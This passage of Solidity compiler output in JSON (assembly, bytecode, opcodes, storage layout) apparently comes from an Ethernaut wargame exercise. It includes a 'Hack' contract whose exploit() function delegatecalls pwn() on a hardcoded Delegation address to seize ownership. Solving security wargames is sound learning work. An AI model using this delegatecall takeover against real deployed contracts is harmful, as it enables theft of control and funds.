											"begin": 1198,
											"end": 1316,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1198,
											"end": 1316,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1322,
											"end": 1544,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 1322,
											"end": 1544,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1415,
											"end": 1419,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1453,
											"end": 1455,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1442,
											"end": 1451,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1438,
											"end": 1456,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1430,
											"end": 1456,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1430,
											"end": 1456,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1466,
											"end": 1537,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1534,
											"end": 1535,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1523,
											"end": 1532,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1519,
											"end": 1536,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1510,
											"end": 1516,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1466,
											"end": 1537,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 1466,
											"end": 1537,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1466,
											"end": 1537,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1466,
											"end": 1537,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1322,
											"end": 1544,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1322,
											"end": 1544,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1322,
											"end": 1544,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1322,
											"end": 1544,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1322,
											"end": 1544,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										}
									]
								}
							},
							"sourceList": [
								"contracts/Ethernaut/06-Delegate.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"owner()": "8da5cb5b"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_delegateAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Ethernaut/06-Delegate.sol\":\"Delegation\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Ethernaut/06-Delegate.sol\":{\"keccak256\":\"0xc7c545e38d49799d771c6687b2f662b5d7ff0b3baa0e3111561e007b7a96cde4\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://b0a7a745245851f7c88079ba9ab2eecf5439b521d424e2131e2ea059528a3a71\",\"dweb:/ipfs/QmUNN87Y5gKDykUpSH1kBjkguPUZ8eGYzKA1WrrUXaJuaU\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 25,
								"contract": "contracts/Ethernaut/06-Delegate.sol:Delegation",
								"label": "owner",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 28,
								"contract": "contracts/Ethernaut/06-Delegate.sol:Delegation",
								"label": "delegate",
								"offset": 0,
								"slot": "1",
								"type": "t_contract(Delegate)23"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_contract(Delegate)23": {
								"encoding": "inplace",
								"label": "contract Delegate",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"Hack": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "bool",
									"name": "success",
									"type": "bool"
								},
								{
									"indexed": false,
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "Response",
							"type": "event"
						},
						{
							"inputs": [],
							"name": "exploit",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/Ethernaut/06-Delegate.sol\":564:1224  contract Hack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Ethernaut/06-Delegate.sol\":840:882  0xf8e81D47203A594245E36C48e151709F0C19fBe8 */\n  0xf8e81d47203a594245e36c48e151709f0c19fbe8\n    /* \"contracts/Ethernaut/06-Delegate.sol\":797:883  Delegation delegationContract = Delegation(0xf8e81D47203A594245E36C48e151709F0C19fBe8) */\n  0x00\n  dup1\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Ethernaut/06-Delegate.sol\":564:1224  contract Hack {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Ethernaut/06-Delegate.sol\":564:1224  contract Hack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x63d9b770\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Ethernaut/06-Delegate.sol\":892:1221  function exploit() public {... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n    tag_5:\n        /* \"contracts/Ethernaut/06-Delegate.sol\":1061:1073  bool success */\n      0x00\n        /* \"contracts/Ethernaut/06-Delegate.sol\":1075:1092  bytes memory data */\n      dup1\n        /* \"contracts/Ethernaut/06-Delegate.sol\":1104:1122  delegationContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/06-Delegate.sol\":1096:1136  address(delegationContract).delegatecall */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ethernaut/06-Delegate.sol\":1137:1169  abi.encodeWithSignature(\"pwn()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0xdd365b8b00000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Ethernaut/06-Delegate.sol\":1096:1170  address(delegationContract).delegatecall(abi.encodeWithSignature(\"pwn()\")) */\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      gas\n      delegatecall\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_11\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_10)\n    tag_11:\n      0x60\n      swap2\n      pop\n    tag_10:\n      pop\n        /* \"contracts/Ethernaut/06-Delegate.sol\":1060:1170  (bool success, bytes memory data) = address(delegationContract).delegatecall(abi.encodeWithSignature(\"pwn()\")) */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"contracts/Ethernaut/06-Delegate.sol\":1190:1213  Response(success, data) */\n      0x13848c3e38f8886f3f5d2ad9dff80d8092c2bbb8efd5b887a99c2c6cfc09ac2a\n        /* \"contracts/Ethernaut/06-Delegate.sol\":1199:1206  success */\n      dup3\n        /* \"contracts/Ethernaut/06-Delegate.sol\":1208:1212  data */\n      dup3\n        /* \"contracts/Ethernaut/06-Delegate.sol\":1190:1213  Response(success, data) */\n      mload(0x40)\n      tag_12\n      swap3\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/Ethernaut/06-Delegate.sol\":918:1221  {... */\n      pop\n      pop\n        /* \"contracts/Ethernaut/06-Delegate.sol\":892:1221  function exploit() public {... */\n      jump\t// out\n        /* \"#utility.yul\":7:105   */\n    tag_14:\n        /* \"#utility.yul\":58:64   */\n      0x00\n        /* \"#utility.yul\":92:97   */\n      dup2\n        /* \"#utility.yul\":86:98   */\n      mload\n        /* \"#utility.yul\":76:98   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:105   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":111:258   */\n    tag_15:\n        /* \"#utility.yul\":212:223   */\n      0x00\n        /* \"#utility.yul\":249:252   */\n      dup2\n        /* \"#utility.yul\":234:252   */\n      swap1\n      pop\n        /* \"#utility.yul\":111:258   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":264:510   */\n    tag_16:\n        /* \"#utility.yul\":345:346   */\n      0x00\n        /* \"#utility.yul\":355:468   */\n    tag_27:\n        /* \"#utility.yul\":369:375   */\n      dup4\n        /* \"#utility.yul\":366:367   */\n      dup2\n        /* \"#utility.yul\":363:376   */\n      lt\n        /* \"#utility.yul\":355:468   */\n      iszero\n      tag_29\n      jumpi\n        /* \"#utility.yul\":454:455   */\n      dup1\n        /* \"#utility.yul\":449:452   */\n      dup3\n        /* \"#utility.yul\":445:456   */\n      add\n        /* \"#utility.yul\":439:457   */\n      mload\n        /* \"#utility.yul\":435:436   */\n      dup2\n        /* \"#utility.yul\":430:433   */\n      dup5\n        /* \"#utility.yul\":426:437   */\n      add\n        /* \"#utility.yul\":419:458   */\n      mstore\n        /* \"#utility.yul\":391:393   */\n      0x20\n        /* \"#utility.yul\":388:389   */\n      dup2\n        /* \"#utility.yul\":384:394   */\n      add\n        /* \"#utility.yul\":379:394   */\n      swap1\n      pop\n        /* \"#utility.yul\":355:468   */\n      jump(tag_27)\n    tag_29:\n        /* \"#utility.yul\":502:503   */\n      0x00\n        /* \"#utility.yul\":493:499   */\n      dup5\n        /* \"#utility.yul\":488:491   */\n      dup5\n        /* \"#utility.yul\":484:500   */\n      add\n        /* \"#utility.yul\":477:504   */\n      mstore\n        /* \"#utility.yul\":326:510   */\n      pop\n        /* \"#utility.yul\":264:510   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":516:902   */\n    tag_17:\n        /* \"#utility.yul\":620:623   */\n      0x00\n        /* \"#utility.yul\":648:686   */\n      tag_31\n        /* \"#utility.yul\":680:685   */\n      dup3\n        /* \"#utility.yul\":648:686   */\n      tag_14\n      jump\t// in\n    tag_31:\n        /* \"#utility.yul\":702:790   */\n      tag_32\n        /* \"#utility.yul\":783:789   */\n      dup2\n        /* \"#utility.yul\":778:781   */\n      dup6\n        /* \"#utility.yul\":702:790   */\n      tag_15\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":695:790   */\n      swap4\n      pop\n        /* \"#utility.yul\":799:864   */\n      tag_33\n        /* \"#utility.yul\":857:863   */\n      dup2\n        /* \"#utility.yul\":852:855   */\n      dup6\n        /* \"#utility.yul\":845:849   */\n      0x20\n        /* \"#utility.yul\":838:843   */\n      dup7\n        /* \"#utility.yul\":834:850   */\n      add\n        /* \"#utility.yul\":799:864   */\n      tag_16\n      jump\t// in\n    tag_33:\n        /* \"#utility.yul\":889:895   */\n      dup1\n        /* \"#utility.yul\":884:887   */\n      dup5\n        /* \"#utility.yul\":880:896   */\n      add\n        /* \"#utility.yul\":873:896   */\n      swap2\n      pop\n        /* \"#utility.yul\":624:902   */\n      pop\n        /* \"#utility.yul\":516:902   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":908:1179   */\n    tag_8:\n        /* \"#utility.yul\":1038:1041   */\n      0x00\n        /* \"#utility.yul\":1060:1153   */\n      tag_35\n        /* \"#utility.yul\":1149:1152   */\n      dup3\n        /* \"#utility.yul\":1140:1146   */\n      dup5\n        /* \"#utility.yul\":1060:1153   */\n      tag_17\n      jump\t// in\n    tag_35:\n        /* \"#utility.yul\":1053:1153   */\n      swap2\n      pop\n        /* \"#utility.yul\":1170:1173   */\n      dup2\n        /* \"#utility.yul\":1163:1173   */\n      swap1\n      pop\n        /* \"#utility.yul\":908:1179   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1185:1275   */\n    tag_18:\n        /* \"#utility.yul\":1219:1226   */\n      0x00\n        /* \"#utility.yul\":1262:1267   */\n      dup2\n        /* \"#utility.yul\":1255:1268   */\n      iszero\n        /* \"#utility.yul\":1248:1269   */\n      iszero\n        /* \"#utility.yul\":1237:1269   */\n      swap1\n      pop\n        /* \"#utility.yul\":1185:1275   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1281:1390   */\n    tag_19:\n        /* \"#utility.yul\":1362:1383   */\n      tag_38\n        /* \"#utility.yul\":1377:1382   */\n      dup2\n        /* \"#utility.yul\":1362:1383   */\n      tag_18\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":1357:1360   */\n      dup3\n        /* \"#utility.yul\":1350:1384   */\n      mstore\n        /* \"#utility.yul\":1281:1390   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1396:1564   */\n    tag_20:\n        /* \"#utility.yul\":1479:1490   */\n      0x00\n        /* \"#utility.yul\":1513:1519   */\n      dup3\n        /* \"#utility.yul\":1508:1511   */\n      dup3\n        /* \"#utility.yul\":1501:1520   */\n      mstore\n        /* \"#utility.yul\":1553:1557   */\n      0x20\n        /* \"#utility.yul\":1548:1551   */\n      dup3\n        /* \"#utility.yul\":1544:1558   */\n      add\n        /* \"#utility.yul\":1529:1558   */\n      swap1\n      pop\n        /* \"#utility.yul\":1396:1564   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1570:1672   */\n    tag_21:\n        /* \"#utility.yul\":1611:1617   */\n      0x00\n        /* \"#utility.yul\":1662:1664   */\n      0x1f\n        /* \"#utility.yul\":1658:1665   */\n      not\n        /* \"#utility.yul\":1653:1655   */\n      0x1f\n        /* \"#utility.yul\":1646:1651   */\n      dup4\n        /* \"#utility.yul\":1642:1656   */\n      add\n        /* \"#utility.yul\":1638:1666   */\n      and\n        /* \"#utility.yul\":1628:1666   */\n      swap1\n      pop\n        /* \"#utility.yul\":1570:1672   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1678:2051   */\n    tag_22:\n        /* \"#utility.yul\":1764:1767   */\n      0x00\n        /* \"#utility.yul\":1792:1830   */\n      tag_42\n        /* \"#utility.yul\":1824:1829   */\n      dup3\n        /* \"#utility.yul\":1792:1830   */\n      tag_14\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":1846:1916   */\n      tag_43\n        /* \"#utility.yul\":1909:1915   */\n      dup2\n        /* \"#utility.yul\":1904:1907   */\n      dup6\n        /* \"#utility.yul\":1846:1916   */\n      tag_20\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":1839:1916   */\n      swap4\n      pop\n        /* \"#utility.yul\":1925:1990   */\n      tag_44\n        /* \"#utility.yul\":1983:1989   */\n      dup2\n        /* \"#utility.yul\":1978:1981   */\n      dup6\n        /* \"#utility.yul\":1971:1975   */\n      0x20\n        /* \"#utility.yul\":1964:1969   */\n      dup7\n        /* \"#utility.yul\":1960:1976   */\n      add\n        /* \"#utility.yul\":1925:1990   */\n      tag_16\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":2015:2044   */\n      tag_45\n        /* \"#utility.yul\":2037:2043   */\n      dup2\n        /* \"#utility.yul\":2015:2044   */\n      tag_21\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":2010:2013   */\n      dup5\n        /* \"#utility.yul\":2006:2045   */\n      add\n        /* \"#utility.yul\":1999:2045   */\n      swap2\n      pop\n        /* \"#utility.yul\":1768:2051   */\n      pop\n        /* \"#utility.yul\":1678:2051   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2057:2464   */\n    tag_13:\n        /* \"#utility.yul\":2190:2194   */\n      0x00\n        /* \"#utility.yul\":2228:2230   */\n      0x40\n        /* \"#utility.yul\":2217:2226   */\n      dup3\n        /* \"#utility.yul\":2213:2231   */\n      add\n        /* \"#utility.yul\":2205:2231   */\n      swap1\n      pop\n        /* \"#utility.yul\":2241:2306   */\n      tag_47\n        /* \"#utility.yul\":2303:2304   */\n      0x00\n        /* \"#utility.yul\":2292:2301   */\n      dup4\n        /* \"#utility.yul\":2288:2305   */\n      add\n        /* \"#utility.yul\":2279:2285   */\n      dup6\n        /* \"#utility.yul\":2241:2306   */\n      tag_19\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":2353:2362   */\n      dup2\n        /* \"#utility.yul\":2347:2351   */\n      dup2\n        /* \"#utility.yul\":2343:2363   */\n      sub\n        /* \"#utility.yul\":2338:2340   */\n      0x20\n        /* \"#utility.yul\":2327:2336   */\n      dup4\n        /* \"#utility.yul\":2323:2341   */\n      add\n        /* \"#utility.yul\":2316:2364   */\n      mstore\n        /* \"#utility.yul\":2381:2457   */\n      tag_48\n        /* \"#utility.yul\":2452:2456   */\n      dup2\n        /* \"#utility.yul\":2443:2449   */\n      dup5\n        /* \"#utility.yul\":2381:2457   */\n      tag_22\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":2373:2457   */\n      swap1\n      pop\n        /* \"#utility.yul\":2057:2464   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220f301cbab970a0240c895191b41e80427ea9ff168e4f556f95880807c7488a46d64736f6c63430008110033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405273f8e81d47203a594245e36c48e151709f0c19fbe86000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b506102ea806100746000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c806363d9b77014610030575b600080fd5b61003861003a565b005b60008060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527fdd365b8b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161010491906101f7565b600060405180830381855af49150503d806000811461013f576040519150601f19603f3d011682016040523d82523d6000602084013e610144565b606091505b50915091507f13848c3e38f8886f3f5d2ad9dff80d8092c2bbb8efd5b887a99c2c6cfc09ac2a828260405161017a929190610284565b60405180910390a15050565b600081519050919050565b600081905092915050565b60005b838110156101ba57808201518184015260208101905061019f565b60008484015250505050565b60006101d182610186565b6101db8185610191565b93506101eb81856020860161019c565b80840191505092915050565b600061020382846101c6565b915081905092915050565b60008115159050919050565b6102238161020e565b82525050565b600082825260208201905092915050565b6000601f19601f8301169050919050565b600061025682610186565b6102608185610229565b935061027081856020860161019c565b6102798161023a565b840191505092915050565b6000604082019050610299600083018561021a565b81810360208301526102ab818461024b565b9050939250505056fea2646970667358221220f301cbab970a0240c895191b41e80427ea9ff168e4f556f95880807c7488a46d64736f6c63430008110033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0xF8E81D47203A594245E36C48E151709F0C19FBE8 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2EA DUP1 PUSH2 0x74 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x63D9B770 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x3A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xDD365B8B00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x104 SWAP2 SWAP1 PUSH2 0x1F7 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x13F JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x144 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP PUSH32 0x13848C3E38F8886F3F5D2AD9DFF80D8092C2BBB8EFD5B887A99C2C6CFC09AC2A DUP3 DUP3 PUSH1 0x40 MLOAD PUSH2 0x17A SWAP3 SWAP2 SWAP1 PUSH2 0x284 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x1BA JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x19F JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1D1 DUP3 PUSH2 0x186 JUMP JUMPDEST PUSH2 0x1DB DUP2 DUP6 PUSH2 0x191 JUMP JUMPDEST SWAP4 POP PUSH2 0x1EB DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x19C JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x203 DUP3 DUP5 PUSH2 0x1C6 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x223 DUP2 PUSH2 0x20E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x256 DUP3 PUSH2 0x186 JUMP JUMPDEST PUSH2 0x260 DUP2 DUP6 PUSH2 0x229 JUMP JUMPDEST SWAP4 POP PUSH2 0x270 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x19C JUMP JUMPDEST PUSH2 0x279 DUP2 PUSH2 0x23A JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x299 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x21A JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x20 DUP4 ADD MSTORE PUSH2 0x2AB DUP2 DUP5 PUSH2 0x24B JUMP JUMPDEST SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 RETURN ADD 0xCB 0xAB SWAP8 EXP MUL BLOCKHASH 0xC8 SWAP6 NOT SHL COINBASE 0xE8 DIV 0x27 0xEA SWAP16 CALL PUSH9 0xE4F556F95880807C74 DUP9 LOG4 PUSH14 0x64736F6C63430008110033000000 ",
							"sourceMap": "564:660:0:-:0;;;840:42;797:86;;;;;;;;;;;;;;;;;;;;564:660;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@exploit_102": {
									"entryPoint": 58,
									"id": 102,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 538,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack": {
									"entryPoint": 587,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 454,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 503,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_bool_t_bytes_memory_ptr__to_t_bool_t_bytes_memory_ptr__fromStack_reversed": {
									"entryPoint": 644,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 1
								},
								"array_length_t_bytes_memory_ptr": {
									"entryPoint": 390,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack": {
									"entryPoint": 553,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 401,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 526,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"copy_memory_to_memory_with_cleanup": {
									"entryPoint": 412,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"round_up_to_mul_of_32": {
									"entryPoint": 570,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:2467:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "65:40:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "76:22:1",
